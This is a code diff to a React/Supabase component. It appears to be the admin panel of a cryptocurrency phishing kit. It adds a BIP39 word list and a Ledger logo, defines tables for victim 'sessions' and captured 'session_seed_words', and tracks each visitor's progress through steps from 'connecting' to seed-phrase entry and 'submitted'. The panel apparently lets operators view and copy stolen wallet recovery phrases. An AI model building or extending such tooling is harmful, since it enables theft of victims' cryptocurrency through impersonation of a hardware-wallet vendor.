@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import type { Tables } from "@/integrations/supabase/types";
 import { Card } from "@/components/ui/card";
@@ -6,13 +6,18 @@ import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Eye, Copy } from "lucide-react";
 import { toast } from "sonner";
+import { BIP39_WORDS } from "@/assets/bip39";
+import ledgerLogo from "@/assets/ledger-logo.svg";
 
 type Session = Tables<"sessions">;
 type SeedWord = Tables<"session_seed_words">;
 type EventRow = Tables<"session_events">;
 
 const STEP_OPTIONS = ["landing", "connecting", "wizard_1", "wizard_2", "wizard_3", "seed_modal", "seed_12", "seed_18", "seed_24", "submitted"];
+
 
 function isActive(s: Session) {
   const age = Date.now() - new Date(s.last_seen_at).getTime();
